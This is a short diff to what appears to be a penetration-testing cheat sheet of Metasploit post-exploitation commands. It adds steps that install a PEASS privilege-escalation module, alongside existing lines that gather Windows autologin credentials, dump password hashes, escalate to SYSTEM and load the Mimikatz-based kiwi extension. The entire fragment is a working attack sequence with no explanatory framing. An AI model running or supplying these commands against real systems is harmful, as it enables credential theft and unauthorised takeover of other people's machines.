@@ -398,6 +398,8 @@ run post/windows/gather/credentials/windows_autologin
 hashdump
 use priv
 getsystem
+cp /root/Tools/Inf/privilege-escalation-awesome-scripts-suite/metasploit/peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/
+reload_all
 load kiwi
 background
 sessions
